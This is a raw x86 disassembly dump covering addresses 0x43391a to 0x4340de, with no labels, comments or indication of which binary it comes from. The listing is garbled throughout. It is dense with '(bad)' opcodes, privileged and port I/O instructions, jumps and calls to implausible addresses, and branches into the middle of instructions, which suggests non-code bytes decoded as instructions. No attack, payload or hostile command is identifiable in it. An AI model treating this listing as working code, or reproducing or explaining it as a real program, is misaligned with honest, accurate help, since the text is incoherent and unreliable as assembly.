  43391a:	mov    eax,0x148a8b
  43391f:	push   ecx
  433920:	enter  0xc145,0x83
  433924:	cmp    cl,BYTE PTR [eax]
  433926:	add    BYTE PTR [ebp+0x4d],al
  433929:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43392f:	call   0xffa3349e
  433934:	cmp    eax,DWORD PTR [ebp-0xc]
  433937:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43393b:	push   ebp
  43393c:	(bad)
  43393f:	std    
  433940:	lock push DWORD PTR [edi+0x5d08fcdb]
  433947:	inc    ebp
  433948:	(bad)  
  433949:	call   0xff7d35d9
  43394e:	add    al,BYTE PTR [ebp+0x37]
  433951:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433957:	jne    0x433959
  433959:	(bad)  
  43395a:	cmp    edi,esp
  43395c:	jne    0x43398f
  43395e:	mov    edi,edi
  433960:	or     BYTE PTR [ebx-0x307f0b49],cl
  433966:	pop    ds
  433967:	into   
  433968:	je     0x43392b
  43396a:	mov    ebx,DWORD PTR [esi]
  43396c:	or     BYTE PTR [ebp-0x49],al
  43396f:	mov    esp,DWORD PTR [esi-0x77]
  433972:	mov    esi,0xfe451f0c
  433977:	mov    eax,DWORD PTR [eax]
  433979:	or     al,0x66
  43397b:	sar    bl,0x3b
  43397e:	xor    esi,DWORD PTR [ebp+0x66]
  433981:	xor    ecx,edi
  433983:	pop    edi
  433984:	adc    bl,BYTE PTR [ebx+0x7e]
  433987:	ret    0xff
  43398a:	cld    
  43398b:	inc    ebp
  43398c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433992:	cld    
  433993:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  43399a:	push   0xffffff83
  43399c:	pop    edi
  43399d:	or     BYTE PTR [ebp+0x53],dh
  4339a0:	xorps  xmm1,xmm2
  4339a3:	test   BYTE PTR [eax+eax*1],bh
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	adc    eax,eax
  4339aa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4339b2:	jmp    DWORD PTR [eax]
  4339b4:	ror    al,0x5e
  4339b7:	inc    ebp
  4339b8:	leave  
  4339b9:	xor    ecx,DWORD PTR [eax]
  4339bb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  4339c1:	add    ch,al
  4339c3:	xor    edi,edi
  4339c5:	xor    DWORD PTR [ebx],0x660033fe
  4339cb:	mov    DWORD PTR [ebp-0xc],ecx
  4339ce:	pcmpgtw mm0,mm0
  4339d1:	add    dl,ah
  4339d3:	leave  
  4339d4:	mov    edi,DWORD PTR [eax-0x7d]
  4339d7:	push   ax
  4339d9:	dec    ebp
  4339da:	mov    esi,DWORD PTR [ebx-0x75]
  4339dd:	lea    ebp,[eax-0x7c00fffe]
  4339e3:	xor    eax,DWORD PTR [eax]
  4339e5:	sysret 
  4339e7:	dec    ebp
  4339e8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4339ef:	push   WORD PTR [ecx+0x8]
  4339f3:	jne    0x4339b6
  4339f5:	ud0    ecx,DWORD PTR [ecx]
  4339f8:	mov    edi,DWORD PTR [edx]
  4339fa:	lods   al,BYTE PTR ds:[esi]
  4339fb:	add    BYTE PTR [eax],al
  4339fd:	data16 (bad) 
  4339ff:	iret   
  433a00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433a07:	cli    
  433a08:	inc    ebp
  433a09:	cmp    al,0x8d
  433a0b:	add    BYTE PTR [esi+0x2d],ah
  433a0e:	inc    ebp
  433a0f:	pop    ebp
  433a10:	lea    ecx,[edi]
  433a12:	mov    dl,bh
  433a14:	add    BYTE PTR [edi],cl
  433a16:	mov    DWORD PTR [eax+eax*8],edi
  433a19:	mov    ebx,0x3a87
  433a1e:	add    BYTE PTR [ebx],ch
  433a20:	inc    ebp
  433a21:	data16 (bad) 
  433a23:	clc    
  433a24:	int3   
  433a25:	cmp    eax,DWORD PTR [eax]
  433a27:	je     0x4339b2
  433a29:	push   0xffffffc8
  433a2b:	pop    edi
  433a2c:	xchg   DWORD PTR [ebp+0x0],eax
  433a2f:	data16 add BYTE PTR [ebp+0x45],cl
  433a33:	lea    cx,[ebp+0x10]
  433a37:	jb     0x433a39
  433a39:	jmp    0x4339c4
  433a3b:	call   eax
  433a3d:	clc    
  433a3e:	xchg   DWORD PTR [edi+0x1],edi
  433a41:	mov    eax,DWORD PTR [eax]
  433a43:	or     BYTE PTR [ebp-0x49],al
  433a46:	lea    eax,[eax+0x74003154]
  433a4c:	push   edi
  433a4d:	inc    edx
  433a4e:	jge    0x433a4f
  433a50:	mov    DWORD PTR [edi],ecx
  433a52:	fdiv   DWORD PTR [edi-0x6]
  433a55:	inc    DWORD PTR [eax]
  433a57:	xor    edx,DWORD PTR [eax+0x5f]
  433a5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433a5d:	ret    0x0
  433a60:	xor    BYTE PTR [ebp-0x51],cl
  433a63:	cmp    edi,0xf0ff8902
  433a69:	data16 ror al,0x84
  433a6d:	rol    BYTE PTR [eax],0x3b
  433a70:	add    al,dh
  433a72:	dec    eax
  433a73:	xchg   esp,eax
  433a74:	push   ebx
  433a75:	jmp    0x433a02
  433a77:	push   ebp
  433a78:	add    esp,ebp
  433a7a:	add    ebp,esp
  433a7c:	mov    edx,DWORD PTR [edi+0x24]
  433a7f:	clc    
  433a80:	dec    esi
  433a81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433a87:	cmp    BYTE PTR [ebx],al
  433a89:	jne    0x433a14
  433a8b:	xor    esp,eax
  433a8d:	jmp    0x463c10
  433a92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433a95:	jne    0x433a8b
  433a97:	call   0xffcd37f1
  433a9c:	clc    
  433a9d:	xchg   edi,eax
  433a9e:	sti    
  433a9f:	add    DWORD PTR [ebx],eax
  433aa1:	add    BYTE PTR [ebp+0x47],bl
  433aa4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433aaa:	pop    ebp
  433aab:	mov    DWORD PTR [esi-0x48],esi
  433aae:	jmp    0x433af7
  433ab0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433ab6:	(bad)  
  433ab8:	cmp    al,0x0
  433aba:	cmp    eax,DWORD PTR [ebp+0x18]
  433abd:	lea    ebx,[ebp-0x56]
  433ac0:	jle    0x433ac2
  433ac2:	jae    0x433a4d
  433ac4:	mov    eax,esp
  433ac6:	call   0xb900:0x8b005587
  433acd:	inc    ebp
  433ace:	push   ebp
  433acf:	lea    ecx,[ebp-0x27ff4f12]
  433ad5:	mov    eax,edi
  433ad7:	int3   
  433ad8:	push   ebp
  433ad9:	xchg   edi,eax
  433adb:	add    esp,ebp
  433add:	add    BYTE PTR [eax],al
  433adf:	inc    ebp
  433ae0:	add    BYTE PTR [ebp+0x8b3255],cl
  433ae6:	cld    
  433ae7:	mov    DWORD PTR [edx],edi
  433ae9:	aam    0x75
  433aeb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433af1:	mov    DWORD PTR [ebx-0x50],edx
  433af4:	test   BYTE PTR [ebp-0x1],0xe8
  433af8:	mov    eax,DWORD PTR [eax]
  433afa:	hlt    
  433afb:	add    al,al
  433afd:	mov    eax,DWORD PTR ds:0x890045a8
  433b03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433b09:	inc    DWORD PTR [eax*2+0xf75854d]
  433b10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433b16:	call   0x72999857
  433b1b:	je     0x433b7b
  433b1d:	js     0x433b7e
  433b1f:	lock ret 0x7e
  433b23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433b29:	mov    edi,edi
  433b2b:	sbb    al,bl
  433b2d:	clc    
  433b2e:	add    BYTE PTR [ebp-0x73],bh
  433b31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433b37:	ror    BYTE PTR [eax],1
  433b39:	dec    ebp
  433b3a:	xchg   ebp,eax
  433b3b:	mov    edi,edi
  433b3d:	in     al,0x8b
  433b3f:	jge    0x433aca
  433b41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433b47:	clc    
  433b48:	pop    esi
  433b49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433b4f:	clc    
  433b50:	add    al,0x6e
  433b52:	mov    eax,DWORD PTR [ebx]
  433b54:	mov    BYTE PTR [ebp+0x0],dl
  433b57:	mov    edx,DWORD PTR [ebx-0x20]
  433b5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433b60:	add    eax,0x3b3a73
  433b65:	adc    al,0x89
  433b67:	pop    eax
  433b68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433b6c:	ret    0xf08
  433b6f:	cmp    al,0x2
  433b71:	mov    DWORD PTR [edx],edi
  433b73:	cld    
  433b74:	add    BYTE PTR [ebp+0x66],dl
  433b77:	add    eax,ebx
  433b79:	add    esp,eax
  433b7b:	sub    eax,eax
  433b7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433b83:	add    BYTE PTR [eax],al
  433b85:	mov    DWORD PTR [ebx-0x24],ebx
  433b88:	push   edi
  433b89:	push   ebp
  433b8a:	clc    
  433b8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433b92:	out    0xff,eax
  433b94:	add    edx,DWORD PTR [eax]
  433b96:	jmp    0x433b80
  433b98:	cmp    ch,0x44
  433b9b:	(bad)  
  433b9c:	jmp    0x40c8c3ee
  433ba1:	je     0x433b2d
  433ba3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ba9:	inc    ebp
  433baa:	add    BYTE PTR [ebx-0x770375],al
  433bb0:	add    ah,ch
  433bb2:	add    edx,esp
  433bb4:	pop    edi
  433bb5:	pop    ebp
  433bb6:	push   ebp
  433bb7:	inc    ebx
  433bb8:	in     al,dx
  433bb9:	pop    ebp
  433bba:	in     al,dx
  433bbb:	cmp    edx,DWORD PTR [edi-0x8]
  433bbe:	ss xchg esp,eax
  433bc0:	pushf  
  433bc1:	pop    ebx
  433bc2:	mov    ecx,ecx
  433bc4:	call   0x899882cd
  433bc9:	in     al,dx
  433bca:	in     al,0x45
  433bcc:	dec    ebp
  433bcd:	push   esi
  433bce:	test   DWORD PTR [eax+0xfb010f],esi
  433bd4:	add    BYTE PTR [eax+0xc018b],dh
  433bda:	leave  
  433bdb:	inc    ebp
  433bdc:	test   al,ch
  433bde:	add    dh,bh
  433be0:	add    bh,bh
  433be2:	dec    ebp
  433be3:	push   cs
  433be4:	mov    DWORD PTR [ecx],eax
  433be6:	hlt    
  433be7:	push   es
  433be8:	dec    ebp
  433be9:	leave  
  433bea:	mov    DWORD PTR [eax],ecx
  433bec:	clc    
  433bed:	cmovge eax,ecx
  433bf0:	mov    ecx,0x85c2f0
  433bf6:	clc    
  433bf7:	pop    DWORD PTR [ebp+0x1]
  433bfa:	push   ebx
  433bfb:	add    BYTE PTR [ebp-0x15],bh
  433bfe:	push   esi
  433bff:	xor    eax,0x898a45
  433c04:	cld    
  433c05:	inc    BYTE PTR [ebp+0x0]
  433c08:	cmp    BYTE PTR [esi-0x64],ah
  433c0b:	add    DWORD PTR [esi+0x78308c1],edi
  433c11:	add    ah,BYTE PTR [edi-0x49]
  433c14:	int    0xbb
  433c16:	mov    ecx,DWORD PTR [edi+0xc]
  433c19:	add    dh,al
  433c1b:	cmp    ecx,ebx
  433c1d:	jne    0x433be7
  433c1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433c22:	jmp    0xca3c28
  433c27:	add    DWORD PTR [ebp+0x0],eax
  433c2a:	mov    eax,ebx
  433c2c:	or     al,0x8b
  433c2e:	(bad)  
  433c2f:	mov    ecx,esi
  433c31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433c38:	mov    eax,edi
  433c3a:	or     BYTE PTR [edx],cl
  433c3c:	shl    cl,cl
  433c3e:	icebp  
  433c3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433c43:	or     BYTE PTR [edx+eax*2],cl
  433c46:	(bad)  
  433c47:	or     cl,dh
  433c49:	stc    
  433c4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433c4e:	xor    al,0x0
  433c50:	inc    ebp
  433c51:	xchg   BYTE PTR [ebx],al
  433c53:	add    esp,edi
  433c55:	add    BYTE PTR [ebp-0x39],cl
  433c58:	mov    al,bl
  433c5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433c60:	sub    al,0xbf
  433c62:	jmp    0x433be9
  433c64:	mov    edi,eax
  433c66:	lock jge 0x433c5a
  433c69:	lea    esi,[edx-0x74bad5fd]
  433c6f:	mov    ebp,esp
  433c71:	or     cl,dh
  433c73:	leave  
  433c74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433c7b:	dec    ebp
  433c7c:	dec    ebp
  433c7d:	test   DWORD PTR [ebx],eax
  433c7f:	paddb  mm6,mm0
  433c82:	add    DWORD PTR [eax],eax
  433c84:	dec    ebp
  433c85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433c8b:	mov    esi,DWORD PTR [edx]
  433c8d:	or     al,0x2b
  433c8f:	dec    ebp
  433c90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433c96:	mov    esp,edx
  433c98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433c9f:	mov    DWORD PTR [ebx],ebp
  433ca1:	call   0xc76c5d1
  433ca6:	mov    DWORD PTR [ebp+0x10],ecx
  433ca9:	(bad)  
  433caa:	push   0x8b85ff10
  433caf:	clc    
  433cb0:	or     al,0x51
  433cb2:	(bad)  
  433cb3:	push   ecx
  433cb4:	retf   
  433cb5:	mov    ebx,0xff4d8dc8
  433cba:	mov    DWORD PTR [ebp+0x8],eax
  433cbd:	xor    eax,DWORD PTR [ebp-0x75]
  433cc0:	cmp    ebp,DWORD PTR [ebx]
  433cc2:	lsl    ebx,WORD PTR [edi-0x8]
  433cc6:	call   DWORD PTR [ebx-0x741bff75]
  433ccc:	(bad)  
  433ccd:	or     al,0x5b
  433ccf:	dec    ebp
  433cd0:	or     BYTE PTR [ebx],dh
  433cd2:	inc    ebp
  433cd3:	xor    esi,DWORD PTR ds:0x708088d
  433cd9:	in     eax,0x99
  433cdb:	add    BYTE PTR [edx],dh
  433cdd:	inc    ebp
  433cde:	pop    edi
  433cdf:	xor    eax,edx
  433ce1:	test   DWORD PTR [eax],0x81108b8b
  433ce7:	dec    ebp
  433ce8:	sub    al,0x33
  433cea:	add    BYTE PTR [ebx],dh
  433cec:	push   esi
  433ced:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433cf3:	mov    edi,eax
  433cf5:	or     BYTE PTR [ebp+0x45],al
  433cf8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433cfe:	ss leave 
  433d00:	pushf  
  433d01:	push   es
  433d02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433d0a:	inc    ebp
  433d0b:	cmp    BYTE PTR [esi],0x51
  433d0e:	pushf  
  433d0f:	addr16 (bad) 
  433d11:	shl    esp,1
  433d13:	dec    ebp
  433d14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433d1a:	(bad)  
  433d1b:	jmp    0x8c0b0ff7
  433d20:	aam    0x8
  433d22:	test   DWORD PTR [ebp-0x8],ecx
  433d25:	mov    BYTE PTR [ebp-0x75],al
  433d28:	or     BYTE PTR [eax],cl
  433d2a:	add    BYTE PTR [ebp-0x75],dl
  433d2d:	mov    eax,0xfc728b
  433d32:	dec    ebp
  433d33:	enter  0xceba,0x8
  433d37:	retf   0x1807
  433d3a:	ret    0x994d
  433d3d:	mov    esi,DWORD PTR [edx]
  433d3f:	or     al,0x33
  433d41:	into   
  433d42:	add    edx,esi
  433d44:	add    ecx,edx
  433d46:	bswap  eax
  433d48:	ror    esi,0x98
  433d4b:	dec    ebp
  433d4c:	add    cl,ch
  433d4e:	mov    edi,edi
  433d50:	hlt    
  433d51:	inc    esi
  433d53:	inc    ebp
  433d54:	ret    0x4533
  433d57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433d5d:	or     BYTE PTR [ebx],dh
  433d5f:	dec    ebp
  433d60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433d66:	jne    0xff8d3d2d
  433d6c:	inc    ebp
  433d6d:	inc    ebp
  433d6e:	mov    esi,DWORD PTR [ebx]
  433d70:	clc    
  433d71:	pop    esi
  433d72:	ret    0xcaeb
  433d75:	mov    eax,esi
  433d77:	call   0x52048f4a
  433d7c:	dec    ebp
  433d7d:	add    eax,0xf8728b
  433d82:	adc    eax,0xce0ccac9
  433d87:	push   ebp
  433d88:	ret    0xc6ec
  433d8b:	in     al,dx
  433d8c:	call   0x33438a95
  433d91:	push   edi
  433d92:	add    edi,eax
  433d94:	xor    eax,eax
  433d96:	jmp    0x433ddd
  433d98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433d9e:	add    eax,edi
  433da0:	shr    eax,cl
  433da2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433da8:	mov    edi,DWORD PTR [ecx]
  433daa:	in     al,dx
  433dab:	pushf  
  433dac:	ret    0x84c7
  433daf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433db5:	inc    ebp
  433db6:	in     al,dx
  433db7:	ss inc ebp
  433db9:	pushf  
  433dba:	mov    eax,edi
  433dbc:	cld    
  433dbd:	fmul   st(2),st
  433dbf:	sbb    dl,al
  433dc1:	jmp    0x9c3b:0x374d45c1
  433dc8:	jbe    0x433d91
  433dca:	mov    esp,eax
  433dcc:	clc    
  433dcd:	add    BYTE PTR [ebp+0x0],cl
  433dd0:	mov    ecx,ecx
  433dd2:	lea    eax,[ebp-0x5]
  433dd5:	mov    edi,edi
  433dd7:	call   0x51ce8f21
  433ddc:	hlt    
  433ddd:	xor    eax,edx
  433ddf:	mov    esi,0x997284
  433de4:	xor    cl,dl
  433de6:	mov    esi,eax
  433de8:	hlt    
  433de9:	into   
  433dea:	inc    ebp
  433deb:	scas   eax,DWORD PTR es:[edi]
  433dec:	mov    ebp,ecx
  433dee:	cld    
  433def:	add    dl,cl
  433df1:	add    dl,al
  433df3:	inc    ebp
  433df4:	shr    DWORD PTR [ebx],0x4d
  433df7:	xor    edi,DWORD PTR [ebx]
  433df9:	mov    DWORD PTR [edi],ecx
  433dfb:	clc    
  433dfc:	dec    esi
  433dfd:	inc    ebp
  433dfe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433e04:	ret    0xc6ca
  433e07:	mov    BYTE PTR [ebp-0x32],0x53
  433e0b:	scas   eax,DWORD PTR es:[edi]
  433e0c:	inc    ebp
  433e0d:	jmp    0x433e46
  433e0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433e16:	pop    ebx
  433e17:	xor    ecx,DWORD PTR [ebp+0x3]
  433e1a:	mov    eax,DWORD PTR [ebx]
  433e1c:	clc    
  433e1d:	test   edx,ecx
  433e1f:	mov    ecx,esi
  433e21:	cld    
  433e22:	call   0x8ab7836c
  433e27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433e2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433e33:	fdiv   QWORD PTR [ebx]
  433e35:	retf   0xce89
  433e38:	in     al,0xc1
  433e3a:	inc    ebp
  433e3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433e41:	into   
  433e42:	mov    dh,0xc1
  433e45:	call   0x8c1783ce
  433e4a:	(bad)  
  433e4b:	cld    
  433e4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433e4f:	xor    eax,ecx
  433e51:	lea    eax,[ebp+0x8]
  433e54:	mov    esi,DWORD PTR [edx-0x4]
  433e57:	add    dl,al
  433e59:	inc    ebp
  433e5a:	mov    esp,0x32d8998b
  433e5f:	dec    ebp
  433e60:	mov    esi,DWORD PTR [ebx]
  433e62:	cld    
  433e63:	xor    eax,edx
  433e65:	sub    esp,DWORD PTR [edi-0x75]
  433e68:	int    0xec
  433e6a:	sub    ecx,eax
  433e6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433e72:	mov    esi,esp
  433e74:	call   0x34178bfd
  433e79:	inc    DWORD PTR [ebx]
  433e7b:	mov    edi,DWORD PTR [ebx]
  433e7d:	cld    
  433e7e:	jne    0x433ecd
  433e80:	mov    esi,DWORD PTR [ebx]
  433e82:	aam    0x8d
  433e84:	dec    ebp
  433e85:	or     BYTE PTR [ebx],dh
  433e87:	jb     0x433e8c
  433e89:	add    BYTE PTR [edi+0x45],bl
  433e8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433e93:	xor    ebp,esp
  433e95:	xor    eax,edi
  433e97:	sub    edi,esp
  433e99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433e9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433ea6:	inc    ebp
  433ea7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433ead:	clc    
  433eae:	mov    eax,edi
  433eb0:	nop
  433eb1:	fadd   QWORD PTR [eax]
  433eb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433eb9:	jmp    0x433e44
  433ebb:	mov    eax,DWORD PTR [ecx]
  433ebd:	fadd   DWORD PTR [eax]
  433ebf:	inc    ebp
  433ec0:	or     DWORD PTR [ebx],esi
  433ec2:	dec    eax
  433ec3:	add    edx,DWORD PTR [ebx-0x2d]
  433ec6:	dec    ebp
  433ec7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433ecd:	inc    ebp
  433ece:	push   ecx
  433ecf:	mov    dl,BYTE PTR [ecx-0xd]
  433ed2:	xor    ecx,DWORD PTR [ebp-0x45]
  433ed5:	(bad)  
  433ed7:	rol    BYTE PTR [eax],0xc1
  433eda:	ret    
  433edb:	inc    ebp
  433edc:	inc    ebp
  433edd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433ee3:	xor    eax,ebx
  433ee5:	add    eax,DWORD PTR [ebp+0x23]
  433ee8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433eee:	cmp    edi,0xc
  433ef1:	dec    ebp
  433ef2:	inc    ebp
  433ef3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ef9:	inc    ebp
  433efa:	mov    esi,DWORD PTR [ebx]
  433efc:	clc    
  433efd:	lea    eax,[ebp+0x45725407]
  433f03:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433f07:	xor    edi,DWORD PTR [eax]
  433f09:	mov    ecx,0xff8b8d4d
  433f0e:	push   esp
  433f0f:	enter  0x4df7,0x23
  433f13:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433f19:	mov    eax,DWORD PTR [ebx]
  433f1b:	loopne 0x433f08
  433f1d:	ret    0xc68b
  433f20:	push   esp
  433f21:	enter  0x9745,0x8b
  433f25:	inc    ebp
  433f26:	cld    
  433f27:	mov    eax,edi
  433f29:	clc    
  433f2a:	ret    
  433f2b:	ret    0xc645
  433f2e:	mov    esi,DWORD PTR [ebx]
  433f30:	cld    
  433f31:	pop    esi
  433f32:	mov    ebx,0x83458bc3
  433f38:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433f3c:	dec    ebp
  433f3d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433f45:	clc    
  433f46:	fcom   DWORD PTR [ebp+0x45]
  433f49:	mov    edi,DWORD PTR [eax]
  433f4b:	adc    al,0x9c
  433f4d:	inc    ebp
  433f4e:	(bad)  
  433f4f:	mov    ebx,eax
  433f51:	adc    al,0x85
  433f53:	cmp    al,0x1
  433f56:	inc    ebp
  433f57:	add    BYTE PTR [edx],bh
  433f59:	dec    ebp
  433f5a:	pushf  
  433f5b:	mov    ebp,ecx
  433f5d:	mov    eax,DWORD PTR [ebx]
  433f5f:	nop
  433f60:	add    BYTE PTR [eax],al
  433f62:	inc    ebp
  433f63:	mov    esi,DWORD PTR [ebx]
  433f65:	add    eax,DWORD PTR [ebx]
  433f67:	cmp    al,0x89
  433f69:	mov    esp,esi
  433f6b:	clc    
  433f6c:	inc    ebp
  433f6d:	inc    ebp
  433f6e:	add    edx,DWORD PTR [esi+0xc]
  433f71:	mov    edi,0x7ff0845
  433f76:	in     al,dx
  433f77:	(bad)  
  433f78:	jne    0x433f13
  433f7a:	mov    esi,DWORD PTR [edx]
  433f7c:	clc    
  433f7d:	add    ebp,DWORD PTR [esi]
  433f7f:	mov    edi,edi
  433f81:	in     al,dx
  433f82:	mov    DWORD PTR [ebp-0x10],eax
  433f85:	xor    eax,DWORD PTR [ebp+0x3]
  433f88:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  433f90:	(bad)  
  433f91:	push   eax
  433f92:	ret    
  433f93:	call   0xd4ffc925
  433f98:	call   0xffcf37e2
  433f9d:	cmp    BYTE PTR [ebp+0x4d],al
  433fa0:	test   DWORD PTR [eax+0x74],ecx
  433fa3:	inc    ecx
  433fa4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433faa:	ret    
  433fab:	inc    eax
  433fac:	dec    DWORD PTR [ebx+0x4945f8f0]
  433fb2:	push   eax
  433fb3:	dec    eax
  433fb4:	test   al,0xd0
  433fb6:	dec    eax
  433fb8:	mov    eax,DWORD PTR [ebp-0x14]
  433fbb:	mov    eax,DWORD PTR [ebp+0x38]
  433fbe:	mov    eax,ecx
  433fc0:	fadd   DWORD PTR [ebx]
  433fc2:	dec    ebp
  433fc3:	inc    eax
  433fc4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433fca:	inc    ebp
  433fcb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433fd1:	fadd   QWORD PTR [ebx]
  433fd3:	inc    ebp
  433fd4:	or     al,0x33
  433fd6:	dec    ebp
  433fd7:	add    edi,DWORD PTR [ebx]
  433fd9:	mov    DWORD PTR [edx-0x28],esi
  433fdc:	mov    eax,DWORD PTR [ebp-0x10]
  433fdf:	mov    eax,DWORD PTR [eax+0x10]
  433fe2:	mov    eax,edi
  433fe4:	lock ret 
  433fe6:	inc    ecx
  433fe7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433fed:	fsubr  st,st(5)
  433fef:	test   DWORD PTR [eax],eax
  433ff1:	clc    
  433ff2:	push   0x45
  433ff4:	(bad)  
  433ff5:	cmp    ebp,esp
  433ff7:	pushf  
  433ff8:	inc    ebp
  433ff9:	(bad)  
  433ffa:	push   eax
  433ffb:	fsub   DWORD PTR [eax-0x7b]
  433ffe:	(bad)  
  433fff:	clc    
  434000:	mov    eax,0xf8008584
  434005:	mov    eax,DWORD PTR [ebp-0x4]
  434008:	mov    edi,0x4585c3cc
  43400e:	clc    
  43400f:	mov    eax,DWORD PTR [ebp+0x14]
  434012:	cmp    BYTE PTR [ebp-0x64],al
  434015:	mov    edi,eax
  434017:	in     al,dx
  434018:	les    esi,FWORD PTR [ebp-0x7b]
  43401b:	mov    edi,eax
  43401d:	or     al,0x4d
  43401f:	dec    ebp
  434020:	mov    eax,ebp
  434022:	in     al,0xf2
  434024:	dec    ebp
  434025:	dec    DWORD PTR [ecx+0x4dc7e045]
  43402b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434031:	inc    ebp
  434032:	mov    DWORD PTR [ebx],esi
  434034:	fadd   QWORD PTR [ebx]
  434036:	dec    ebp
  434037:	push   eax
  434038:	xor    eax,DWORD PTR [ebp+0x3]
  43403b:	push   eax
  43403c:	mov    DWORD PTR [eax+ebx*8],ebx
  43403f:	push   esi
  434041:	mov    eax,DWORD PTR [eax]
  434043:	lock cmp eax,0xf84e85c0
  434049:	inc    ebp
  43404a:	test   BYTE PTR [ebx],dh
  43404c:	add    DWORD PTR [ebx],eax
  43404e:	add    BYTE PTR [eax+0x4d],dl
  434051:	jne    0x434086
  434053:	lea    ecx,[ebx-0x7617fc44]
  434059:	div    ah
  43405b:	inc    DWORD PTR [ebp+0x45]
  43405e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434064:	jb     0x433ff1
  434066:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43406d:	mov    ecx,DWORD PTR [ebp-0x10]
  434070:	xor    ecx,DWORD PTR [ebp+0x3]
  434073:	mov    edi,DWORD PTR [ebx]
  434075:	adc    BYTE PTR [ebp+0x41],dh
  434078:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43407e:	ret    
  43407f:	push   ss
  434080:	push   0x45
  434082:	lea    ecx,[ebx+0x4de80cb0]
  434088:	sti    
  434089:	add    edi,edi
  43408b:	or     BYTE PTR [ebp+0x4d],al
  43408e:	mov    ebp,DWORD PTR [ebx]
  434090:	xor    ebp,ecx
  434092:	mov    al,BYTE PTR [edx]
  434094:	add    eax,0xc7200
  434099:	jne    0x4340e8
  43409b:	lea    esi,[ebx]
  43409d:	mov    al,0xf
  43409f:	call   0xf3764
  4340a4:	shl    DWORD PTR [esi],0x84
  4340a7:	pushf  
  4340a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4340ae:	mov    edi,DWORD PTR [ecx]
  4340b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4340b7:	test   DWORD PTR [eax],eax
  4340b9:	clc    
  4340ba:	dec    ebp
  4340bb:	inc    ebp
  4340bc:	xor    edi,DWORD PTR [ebx]
  4340be:	setl   al
  4340c1:	(bad)  
  4340c2:	retf   
  4340c3:	rol    cl,1
  4340c5:	dec    ebp
  4340c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4340cc:	inc    ebp
  4340cd:	lea    ecx,[ebx-0x75b2cc38]
  4340d3:	lea    eax,ds:0x4d72c4
  4340d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4340dc:	xor    ecx,edi
  4340de:	bswap  ebx
